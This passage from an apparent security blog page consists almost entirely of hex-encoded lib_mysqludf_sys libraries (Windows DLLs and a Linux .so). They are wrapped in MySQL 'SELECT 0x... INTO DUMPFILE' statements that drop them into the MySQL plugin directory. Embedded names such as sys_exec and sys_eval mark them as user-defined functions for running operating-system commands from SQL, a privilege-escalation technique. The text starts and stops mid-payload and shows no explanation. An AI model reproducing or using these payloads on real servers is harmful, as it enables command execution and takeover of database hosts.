436192731a4973446562756767edee6dad266a686546a4556e6840b1b7b7b7643164457846707469af46696c4a6d295b6119b41254de64aeb0176d0dd8114990b9edd61a0a6b409d6d70876547c25a73cd517f77555122b4ed6e591b5c537973186deec3c2eb2e39417373650975697cdb15da434c7d5f687e396d5f2edffedebe5f616d7367087869740b646a753a5f666469ec4217b076260a639a5f64fd6cadb91f5f686f6f6b131459725ff802700148d15fdb9ceb0249730a330a6c21d6f0bd82539c2a64d46e640893050b130f651e6b5b7bc25f2c723456ed6d1c182ff6d69a700a035f706f522947e1ddbe6e106468756c5eb92a6bcb92bd9b1b2ca806e0b6d86e6ec57265250866112e827bdb5673749c637079082439edcd5c6b32c06e4d0fd7ed1f5ac36f7319663a1f5f4370705831c75e3b8474bc6d343f001817ffffffff3d193c1c1b161e55142d16270815270f11115f10130a070d2e17090705160c1e7ffbffff080a0b160918181505061b050c10060717062105110f061421110b08e4fbdfb62b22052a111d0d18532d483806000776fbdbe5080c09330a090b0c051007061612eedffeed0e0b34150b18160d3d0542c205121e14066930ffd8ddff110c0e1d4d0517230d0c3224080b4506f0de041004f03b0a6eff2c01043808041c1c0204003e4c016dff21fd05004afe9f5a8fe00002210b0109080c634f7ad60c1213d616a300200e10c10a01630b02ab3362b7ee6107006003040233351eeed9c0ce34100706c02633d6eddb7620ac22033c144002b0021c5759dd0050520143c8c8ba65b1214200a7b82f06db5d182eb4787407ea0b900c5bfa90cdb742602e72647d610861c90e76c508fb0a00c700a1db66bb77402e26300304301becdb943d001a27c04f73726300eb11c0061b40731c4f78c2c2a365761f01030002ed7760497b27421ba023030000edd8d152127c53030400000000000080ff00000000000000000000807c2408010f85b901000060be007000108dbe00a0ffff5783cdffeb0d9090908a064688074701db75078b1e83eefc11db72edb80100000001db75078b1e83eefc11db11c001db73ef75098b1e83eefc11db73e431c983e803720dc1e0088a064683f0ff747489c501db75078b1e83eefc11db11c901db75078b1e83eefc11db11c975204101db75078b1e83eefc11db11c901db73ef75098b1e83eefc11db73e483c10281fd00f3ffff83d1018d142f83fdfc760f8a02428807474975f7e963ffffff908b0283c204890783c70483e90477f101cfe94cffffff5e89f7b92a0000008a07472ce83c0177f7803f0075f28b078a5f0466c1e808c1c01086c429f880ebe801f0890783c70588d8e2d98dbe005000008b0709c0743c8b5f048d8430b472000001f35083c708ff96f0720000958a074708c074dc89f95748f2ae55ff96f472000009c07407890383c304ebe16131c0c20c0083c7048d5efc31c08a074709c074223cef771101c38b0386c4c1c01086c401f08903ebe2240fc1e010668b0783c702ebe28baef87200008dbe00f0ffffbb0010000050546a045357ffd58d871702000080207f8060287f585054505357ffd558618d4424806a0039c475fa83ec80e9ad98ffff0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005c80000056020000e404000000000000584000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c7472757374496e666f20786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e7633223e0d0a202020203c73656375726974793e0d0a2020202020203c72657175657374656450726976696c656765733e0d0a20202020202020203c726571756573746564457865637574696f6e4c6576656c206c6576656c3d226173496e766f6b6572222075694163636573733d2266616c7365223e3c2f726571756573746564457865637574696f6e4c6576656c3e0d0a2020202020203c2f72657175657374656450726976696c656765733e0d0a202020203c2f73656375726974793e0d0a20203c2f7472757374496e666f3e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564339302e435254222076657273696f6e3d22392e302e32313032322e38222070726f636573736f724172636869746563747572653d2278383622207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e504100000000000000000000000010830000f08200000000000000000000000000001d83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004b45524e454c33322e444c4c004d5356435239302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c467265650000006672656500000000000000004afe9f5a0000000058840000010000001200000012000000a4830000ec8300003484000021100000a312000000100000a4120000a3120000a0120000cc110000a31200009811000086110000a31200009811000076100000a3120000431000002e1100001a110000a91000006d84000083840000a0840000bb840000c7840000da840000eb840000f484000004850000128500001b8500002b8500003985000041850000508500005d850000658500007485000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000700000100000006d3c683e6c3e0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 INTO DUMPFILE &#x27;E:\\phpStudy\\MySQL\\lib\\plugin\\udf32.dll&#x27;;</span><br></pre></td></tr></table></figure><h4 id="lib-mysqludf-sys-64-dll"><a href="#lib-mysqludf-sys-64-dll" class="headerlink" title="lib_mysqludf_sys_64.dll"></a>lib_mysqludf_sys_64.dll</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SELECT 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000e80000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000677cbfda231dd189231dd189231dd18904dbbf89211dd18904dbbc892a1dd18904dbaa89261dd189231dd0890f1dd18904dbac89211dd18904dba089221dd18904dbab89221dd18904dba989221dd18952696368231dd189000000000000000000000000000000005045000064860300a727a15a0000000000000000f00022200b020800002000000010000000800000109f000000900000000000100000000000100000000200000400000000000000050002000000000000c000000010000000000000020000000000100000000000001000000000000000001000000000000010000000000000000000001000000098b2000008020000b0b10000e800000000b00000b00100000050000050010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000800000001000000000000000040000000000000000000000000000800000e0555058310000000000200000009000000012000000040000000000000000000000000000400000e02e727372630000000010000000b000000006000000160000000000000000000000000000400000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332e393100555058210d240209e1e421439d3bdfb7de7400000f0f0000002a0000490000d41de9feff833a007450488b05a421000049890009a24008cd4973d20a9f109c1899cd9f34272096280fb70593666d83fdb7410b30b001c332c0c3cc00c215cc92c9ba810034716a6febcc16e46c096a471853fdbf1fa4631c0fb605591688401e41c7011e00ffed6dd62b8b63bf01750f3f42088338007506c64b26ebdc01017b4e2d632b05b9e4b228ce25227ed20cd26f1f28152ab001c3f66d7bc2bf83ec38344a43895c243084b7fff6dbd90b09ff15c71f2b4885c04c8bd87512104c24df6eaeb9608707202dc4388e897c242873edcdfd33c048c7c1ff0033fbf2ae1c120976d9b75b1af7d122e901890b2dcc00be6feb166f28e3026e404848deda7fdb29f938d87459488d0d40ee4e0e813832983de4c1eb81403281480a9ee4435e4f81503281543281563261f37d4fb0018c48804028c34c49467607744e61deed584917e49260680a703c6527cd18782056c740045cf8bf33b64342188b48048b008d4c010239bd1e77d27d8bd947107543706d8045ec1be936130309884370900a00b69dee10c8980a18bc0cb3c6b00e07103fbcb37ddb0f49a585c974066f5d17b7086d21cf93cf047424ada3b9772d7110448b6949e2fa02c2eddfba52e2ce0212498d5c3001e83f0ffce85cd7fddd5febcb418b03c60430d2470d5734b70c58d7e22d0822d34313167bb75bce2618007ca01cff56677c84842f7198f4cf16c64373870d087c8c03d6e4240f79561e541e511e7292939c4e1e4b1e481e63c2425e3e1e1fcf2784ee87c71f1da0981f4c89c68685ee44241824580f6c59897486bb86db76381764bdb900d34c18284cb0db7e302d4d8bf146e8e7b901ee9b6dc1ec04e00dda4533ed4488670beef69b4ff04c39290f8413050673f215fdcfb8b9169125ac1c088be8747b418d5508e1c9b6b13ac0e6cc177c7466a04b6640fa50669047fc3f42858e1b0b9529328d7936ce6f7d61c16c304375cd8cc74803c8f56636b724d470143e51c5ba08e1d9b68d39cc1ceb13225975ad886cdbb6f050eb258bc77004cd1930ddfe9cdb803e30e2154874229245ffb176d8827811fef5887edd4d174ebe5a0eebc18424805ec606e71ada0001380c4c38f12a10f8386c04c6f0a0581a87e792317fd3dc5cd8d6d09d58747a28f2023f73b773df3e448d48406e41b80010b3748bd1f10df7c7ed33c9ab441a5356104cefa2dbe6b66c02c8d8154e1b8d54b94c350aede98d054a75890ba3b16e3b2dbc3133d2c7d0208925183bdf19b7b3bad2c80df2199d30ac581e29eb081433c0922fb384f13be0064ceb0033c029001bb0dfb65538ec024510ff10c9196600fb6f7f6c900390483b0d89293f751148c1c11066f7dddd6fdfb87502f3dac1c910e9150aeccc405361203b8b7d1b5801a05fdcd25b0bfbeef7f685dbc905112fd005020675098d430185bb76efb6205b42c703d59b0d3c48b406634136670b1c5805b12006615bd85bc3cf55d27f6cc7c7c376fc608468e140dcfbf1c2c63831e83be141bdd20f8503ee46bb7408075ee428073c0f8e0d8de6b61b6e2bc58ed3105fdcfd3e76fb0fb12d602e0a741ef290b9e803c91d19bfdb36931d4275e841320783f802740fb9ef6dc3b31fb70eca0208e2ed0d2f2e338e740fd2111912f874491412fc18dadc0b1fd958f847df72165f1803b6bb2d701e4ad0c9eb081573ed12ecf6bedbcf2774192d06429bd72d0698fbfb66d833db891db80e871db906716fc7feb59806e5413bd5dde26541042530bb7dbbbd002c0978081e8bf3f048b93d883072b0b7920a63c7741ad64618d7d29b2f1c6b75e3eb037bf5a79a5ed6390c950cdaeb3fea1f9f7db7f08e8f080644892d312d1bc485c0678fed62771a15e5de0dd6181abe7fddbbeec7050725024585f67507b404bb833d14ddc96e73068b212a0b2d5c6f11dedd264fe3029cf12c66012d3a273e9e9ebe10c58f38d240e468ec98717a60dce91748c3b14d22190f6c20483a5adbf308505851f0dd05bbee77df3d041f208915d12695d275133915d709ed7f38c3750b5a17c61e83fa017405040add6be00275338931d39d08a3b71b0d34c84e20c574134ac68b07863db9d7a64bfc1616e0c9016b3c1a0edc83ffb092ebda1535ab311bc11bdb5b0bd80c430c1dc817084d7bf787755c0b1841ffd385ff88ff03753970f79d75094a08aeeb8d1ca51e36ec648b171028adeb06d8192ecc298adc25f3008bc3659e8793708b218b8bf8b59d9e2a4055bf15eaa3894d7afab61b01018b080724b0d67d5d902dd9c2302f5e7d0ab1485825ff4ddb960c1e92387d2eda02f101d7136fa3f875056c0cfcfa7d918844a4fd258b036983eb2f9e8e090cefc6f852a1899e2681ec880068cd760dbffe73153f156705b8c648f25845b7390cb8283d1f2c586170c339def61624eb754148b73dc6364238004044230430090e662fcf40280578254703055c73874c1c51494e7d4bb1077f4bf0eb222b8093447bdd837d738d0e83c00812d13e8d67db7b642a059b240d20902f9c5ba25b701c2a7214097bc009cc3e1e666c926724766e833572dbff0b70dc7a142f482c38b0bb2493827b8ef083d2396a14019b15650ccb36dc9255b624c80a271b83d76c1854ba6a234e336b1784f781c4aca041592947a626231c0fd8cf53188186d9ef0d68295a4a148a8ef8ececcdd64427cb1366eb75b908674b32d21dea902d3a1c1128106464200a8b83af334463971bcb36e418c323db83a238243d05f62809993959b611402bdc678c90c136de1bc3017f37320296247f15f4f6120d6276d81bc00383e8013c2075643f289c8d3d53041a787f4b8d1d4c068d13a08491790ec372b3326129a9ef4f137f2344720cc96681394d5a75fcb7c3ff174863513c813c0a5045e1137c0a180b020f94c063e343029f4c63413cfec9b4ebed8d7ed24c03c1413c4014450458064525ffc25f6a4ab10018741f8b510b3bd2720a8b4108ed6ff8db03c209d072104183c113c128453bcb72e16fc796b05d1cc1c3cf4cc1267af7446992e1da85dcbd1f4c2bc15feafb5abed0140ccd0f3a24c1e81f600d2cfef7d083e001eb02584fd644ab360196ebcac0b66c3008eec18b01a7ffaa128d3cc77627252205cc11ce78dca606cb113f75463da70ff0dd4603241b471eb801000000277c29847f3fe520000081bff83c3dfc32a2df2d992b7dc7f83074149d6fa3d00e7f5dc6268b2dc285586b212430bc6286b6489934e10ab9b4c856e04671d849460bb50e731c0eb110d9be10a8d813fe6a4cb84c33dbceb8ff00856037ba1623e9b8338975dde016b1df744d44d89c1d39b705dbdd8449f7d3093720d2fbdc4b4646463605dee0e2e4b24746465e505a11000055c9a8aa298064547fb017d8069017303007d04e6f206172ffffdffe67756d656e7473096c6c6f77656420287564663a206c69625f6d79730bf6b7dd716c0d5f73085f696e666f29411c80edff232076657273696f6e20302e0134ededee17a178706563744b657861076c79201a6dbb7dfb652073747243672074791b2070766175d8299b6d21724f2f7477996d60010b1f438ef6f603fb72206e616d4c436f756c246e6f74cce8b66d3b63611320186d27796372ff850740310106023532023001240d0024f6ffb7ffd407001fc408001a740b15640c0010540b000b340a0004822776bbdcfe1918090018c40f13740e640b093427b763d4ed046217d41e5e3f1903241aedbacf2c5007390f2a07801abbdc6e8367165b16743711640c340b7bd85b770442130c390c01118350118b9b6df705530133871c03e4001d5d90ed60430e057b743f09baeeb0d80401072f67079403a06077dbc10701462f462b1074092f0db6d94e3416033b01000715bb0bb6bd971574062f64f7df21000884ddb640ae043439741f00bf20eeecedb6140629034c341f0ba903e1c2debe240f05c305340a13234bd36d9b6e23431e14c45f0f470a75b713760554094b01098909a2071e7de572bb1f1e742f12640d34870142b71582bb2e1311cf0c03ca96dd0e01380f387427005124a3aafec10246ddcd5d20d266d4ff555516c900178fa02a1b003011764bd56c039180bfa007e0126dd79ddd03703407f803680b0013026a76fbba8603540b14021814170b581590fb2f07d9eeecf60a150310340727030034075bd5b9dd7003e0336f0724b3cc755dd7750b30074203ac0b9007f5b61b94db03c03233920c1903c8ba05a0eb0b10074f8be80b508375afeb077303444707990ba0b65dd77507e503280bf0073a1c033c0038b7eb0b5007f71ca70b77b63bdb8b191d2f2007381dcb40071dac7b5d83036c8307d30b601e9ded5eb3039b7c5f07c11e3be0d0ae3bdb07031f3b1007d6039c33ca1255954a005525a3aaa8aa9251645455c9d09ba0887c0402c4ff16360157616974466f7253ac7f2b40fc6c654f626abd14566972747561f63703c46c419a0d536574456e76126dbf01e26f6ee45661726961622b41eb2e40bc18437265b8546806640df65bf76d47264375727222502a636573734914e283cd1226135469636bb6fd6e03026e6b517565727950036684dedbb1f66d616e3716657218446973676fdbdbcf374c6962727879436192731a52746c633bb76d0970a2722d2c7874124cbdb5adfd6f6f6b7570463ec26916b2747279dfb5078b17cd556e77e47e4973446562736f6bed75676763a7a56583e11dfeb6b77268616e64457883704046696ca56c85c58719f19319dab61254176d65151153daf6586b39352b537973176dfa81e87517454173426509a3dbfe434388a0895f616d73675fcc6990b3850bbf5f5f435f73708b6966285f7e267cdb766f5f64116f035f706f6922430b76db2663da5f64ce280009626b31142d325f7a13c417840b5f7b50705b6c735f330a6c212205db5accd82a58096e73ed6bc982130fd76d643ed6bad6de756c343f15416d170cdea3e0020ab52689a3b565c933a196063bc16db15b0772652508661115080d5ba1739c29709f73149bb5adb93932ae6e074d0f85d7badbc56f736a663a70105e3b84ed70705831747b6d343fdf15f4c700f08c21180800e264860600a76efb0fe327a15ae6f00022200b020808120cb07744b314132e0010000005cf1e6c9b02020433050002088000c302f663146d160100022e063af76c650f0a50394330908de8db88223c1460e2d880d4bd0118020183703aacbb024b00303a011e4644a42b2e1054822d3bd810901200dc00b3dbc63b6f602e7264a76108550b53597761dd000c03162740022e26291b61f600d805100c22273616ececc02e702850eb27244fd820fc007273726300136027b3c7013226650942fca664b0702728421b4036c08d6d05ca7212d3060000000000009000ff0048894c240848895424104c8944241880fa010f854502000053565755488d35cdf0ffff488dbe0080ffff5731db31c94883cdffe85000000001db7402f3c38b1e4883eefc11db8a16f3c3488d042f83f9058a1076214883fdfc771b83e9048b104883c00483e9048917488d7f0473ef83c1048a10741048ffc0881783e9018a10488d7f0175f0f3c3fc415beb0848ffc6881748ffc78a1601db750a8b1e4883eefc11db8a1672e68d410141ffd311c001db750a8b1e4883eefc11db8a1673eb83e8037217c1e0080fb6d209d048ffc683f0ff0f843a0000004863e88d410141ffd311c941ffd311c9751889c183c00241ffd311c901db75088b1e4883eefc11db73ed4881fd00f3ffff11c1e83affffffeb835e4889f7b900120000b2004889fbeb2c8a074883c7013c80720a3c8f7706807ffe0f74062ce83c0177233817751f8b072500ffffff0fc829f801d8ab4883e9048a074883c70148ffc975d9eb0548ffc975be4883ec28488dbe007000008b0709c0744f8b5f04488d8c30b0a100004801f34883c708ff96eca1000048958a0748ffc708c074d74889f94889faffc8f2ae4889e9ff96f4a100004809c074094889034883c308ebd64883c4285d5f5e5b31c0c34883c4284883c704488d5efc31c08a0748ffc709c074233cef77114801c3488b03480fc84801f0488903ebe0240fc1e010668b074883c702ebe1488baefca10000488dbe00f0ffffbb00100000504989e141b8040000004889da4889f94883ec20ffd5488d871702000080207f8060287f4c8d4c24204d8b014889da4889f9ffd54883c4285d5f5e5b488d4424806a004839c475f94883ec804c8b442418488b542410488b4c2408e91f79ffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005cb0000054010000e404000000000000586000003c617373656d626c7920786d6c6e733d2275726e3a736368656d61732d6d6963726f736f66742d636f6d3a61736d2e763122206d616e696665737456657273696f6e3d22312e30223e0d0a20203c646570656e64656e63793e0d0a202020203c646570656e64656e74417373656d626c793e0d0a2020202020203c617373656d626c794964656e7469747920747970653d2277696e333222206e616d653d224d6963726f736f66742e564338302e435254222076657273696f6e3d22382e302e35303630382e30222070726f636573736f724172636869746563747572653d22616d64363422207075626c69634b6579546f6b656e3d2231666338623362396131653138653362223e3c2f617373656d626c794964656e746974793e0d0a202020203c2f646570656e64656e74417373656d626c793e0d0a20203c2f646570656e64656e63793e0d0a3c2f617373656d626c793e0000000000000000000000002cb20000ecb1000000000000000000000000000039b200001cb20000000000000000000000000000000000000000000044b200000000000052b200000000000062b200000000000072b200000000000080b200000000000000000000000000008eb200000000000000000000000000004b45524e454c33322e444c4c004d5356435238302e646c6c00004c6f61644c69627261727941000047657450726f634164647265737300005669727475616c50726f7465637400005669727475616c416c6c6f6300005669727475616c46726565000000667265650000000000000000a727a15a0000000074b30000010000001200000012000000c0b2000008b3000050b300007010000060100000001000008015000060100000701500002014000060100000901300000014000060100000901300003011000060100000c010000000130000e0120000a011000089b300009fb30000bcb30000d7b30000e3b30000f6b3000007b4000010b4000020b400002eb4000037b4000047b4000055b400005db400006cb4000079b4000081b4000090b4000000000100020003000400050006000700080009000a000b000c000d000e000f00100011006c69625f6d7973716c7564665f7379732e646c6c006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f62696e6576616c007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f6576616c007379735f6576616c5f6465696e6974007379735f6576616c5f696e6974007379735f65786563007379735f657865635f6465696e6974007379735f657865635f696e6974007379735f676574007379735f6765745f6465696e6974007379735f6765745f696e6974007379735f736574007379735f7365745f6465696e6974007379735f7365745f696e69740000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 INTO DUMPFILE &#x27;E:\\phpStudy\\MySQL\\lib\\plugin\\udf64.dll&#x27;;</span><br></pre></td></tr></table></figure><h4 id="lib-mysqludf-sys-32-so"><a href="#lib-mysqludf-sys-32-so" class="headerlink" title="lib_mysqludf_sys_32.so"></a>lib_mysqludf_sys_32.so</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 0x7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b00000010